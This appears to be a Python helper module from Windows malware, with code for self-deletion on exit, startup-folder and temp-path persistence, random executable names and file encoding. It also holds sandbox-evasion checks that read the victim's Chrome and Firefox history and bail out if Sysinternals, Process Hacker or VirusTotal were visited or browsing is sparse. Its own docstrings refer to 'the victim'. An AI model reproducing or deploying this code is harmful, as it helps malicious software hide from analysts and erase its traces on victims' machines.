import atexit
import datetime
import os
import random
import sqlite3
import string
import sys
from base64 import b64encode, b85encode, a85encode
from ctypes import Structure, windll, c_uint, sizeof, byref
from os import getlogin, listdir
from os.path import exists, getctime
from os.path import join as path_join
from shutil import copyfile
from typing import NoReturn, List, Tuple
from winreg import OpenKey, HKEY_CURRENT_USER, HKEY_CLASSES_ROOT, QueryValueEx

from actions import run_detached_process

startupFolder = "c:/users/{}/appdata/roaming/microsoft/windows/start menu/programs/startup/{}"
tempFolder = "c:/users/{}/appdata/local/temp/{}"
BaseTempFolder = "c:/users/{}/appdata/local/temp"
TypicalRegistryKey = "SOFTWARE\Microsoft"

url_list = List[str]
browser_info = Tuple[str, str]


class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]


def baseRandomstr(length) -> str:
    """we do this here, as closures can't be applied inside def"""
    base_str = ''.join((random.choice(string.ascii_letters) for x in range(length)))
    return base_str


def random_string(length=0, is_random=False, is_zip=False, is_exe=False, is_py=False) -> str:
    """
    :param length: length of random string.
    """
    if is_random or not length:
        length = random.randrange(5, 15)
    base_str = baseRandomstr(length)
    if is_zip:
        return base_str + '.zip'
    elif is_exe:
        return base_str + '.exe'
    elif is_py:
        return base_str + '.py'
    else:
        return base_str


def base64_encode_file(file_path: str) -> str:
    """
    we are gonna read the file in rb mode, encode in base64, and return the base64.
    :param file_path: full path to file to encode in base64.
    """
    with open(file_path, 'rb') as file:
        base64_info = b64encode(file.read())
        return base64_info.decode()


def base85_encode_file(file_path: str) -> str:
    """
    we are gonna read the file in rb mode, encode in base85, and return the base85.
    :param file_path: full path to file to encode in base85.
    """
    with open(file_path, 'rb') as file:
        base85_info = b85encode(file.read())
        return base85_info.decode()


def a85_encode_file(file_path: str) -> str:
    """
    we are gonna read the file in rb mode, encode in a85, and return the a85.
    :param file_path: full path to file to encode in a85.
    """
    with open(file_path, 'rb') as file:
        a85_info = a85encode(file.read())
        return a85_info.decode()


def get_current_file_path() -> str:
    """
    this function return the full current path to the exe running.
    """
    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle, the PyInstaller bootloader
        # extends the sys module by a flag frozen=True and sets the app
        # path into variable _MEIPASS'.
        application_path = sys.executable
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    return application_path


def get_idle_duration() -> bool:
    """
    this method return the number of seconds which the current pc is idle, as float.
    """
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    return millis / 1000.0


def __remove_at_exit() -> NoReturn:
    run_detached_process(f"Start-Sleep 3; Remove-Item -Force {get_current_file_path()}")
    raise SystemExit()


def remove_on_exit() -> bool:
    """we are gonna remove the file running at exit"""
    atexit.register(__remove_at_exit)
    return True


def is_debug_in_history(urls: url_list) -> bool:
    """we return here true if we find one of those urls in the history
       as those can indicate we are messing with power user or even worse."""
    debug_list = ["https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/procdump",
                  "https://docs.microsoft.com/en-us/sysinternals/downloads/procmon",
                  "https://processhacker.sourceforge.io/",
                  "https://www.virustotal.com",
                  "https://docs.microsoft.com/en-us/sysinternals"]
    for url in urls:
        for debug_url in debug_list:
            if url in debug_url:
                return True
    return False


def getDefaultBrowser() -> browser_info:
    """
    this function return tuple of (full_path_to_browser_exe,browser_name)
    """
    # Get the user choice
    browserName = ""
    browserPath = ""
    with OpenKey(HKEY_CURRENT_USER,
                 r'SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice') as regkey:
        browserName = str(QueryValueEx(regkey, 'ProgId')[0])
    with OpenKey(HKEY_CLASSES_ROOT, r'{}\shell\open\command'.format(browserName)) as regkey:
        browser_path_tuple = QueryValueEx(regkey, None)
        browserPath = str(browser_path_tuple[0].split('"')[1])
    return (browserPath, browserName)


def date_from_webkit(webkit_timestamp):
    epoch_start = datetime.datetime(1601, 1, 1)
    delta = datetime.timedelta(microseconds=int(webkit_timestamp))
    return epoch_start + delta


def dont_used_browser(last_visit_time) -> bool:
    """
    we return here true if the victim didn't used the browser for at least 2 days
    """
    now = datetime.datetime.now()
    last_visit = date_from_webkit(last_visit_time)
    return (now - last_visit).days > 2


def parseFirefox_history(path: str) -> bool:
    """
    :param path: folder of profile
    """
    newPath = f"C:\\Users\\{getlogin}\\AppData\\Local\\temp\\FirefoxNothing"
    places_file = path_join(path, "places.sqlite")
    if not exists(places_file):
        return True
    copyfile(places_file, newPath)
    con = sqlite3.connect(newPath)
    cursor = con.cursor()
    cursor.execute("SELECT moz_places.url from moz_places")
    urls = cursor.fetchall()
    if len(urls) < 50:
        return False
    if is_debug_in_history(urls):
        return False
    # //TODO: add time diff here also
    return True


def parseChrome_history(path: str) -> bool:
    newPath = f"C:\\Users\\{getlogin}\\AppData\\Local\\temp\\ChromeNothing"
    copyfile(path, newPath)
    con = sqlite3.connect(newPath)
    cursor = con.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = cursor.fetchall()
    if len(urls) < 50:
        return False  # we return false if we have less than 50 urls in history
    if is_debug_in_history(urls):
        return False
    last_visit_time = (row[0] for row in cursor.execute("SELECT last_visit_time FROM urls LIMIT 1"))
    if dont_used_browser(last_visit_time):
        return False  # if he didn't used browser in the last 2 days. return false.
    return True


def is_normal_browser_user(bType=False) -> bool:
    """
    :param bType: browser type, in string
    """
    browser_location, browser_name = getDefaultBrowser()
    if 'chrome' in browser_name.lower():
        return is_normal_browser_user(bType='chrome')
    if 'firefox' in browser_name.lower():
        return is_normal_browser_user(bType='firefox')
    else:
        print('[*] could not figure out the browser type')
    if bType == 'chrome':
        possible_locations = [f"C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                              f"C:\\Users\\{getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\databases"]
        for location in possible_locations:
            if exists(location):
                if not parseChrome_history(location):
                    return False
                return True
        return False
    if bType == "firefox":
        profiles = listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\")
        if not parseFirefox_history(max(profiles, key=getctime)):
            return False
    return True
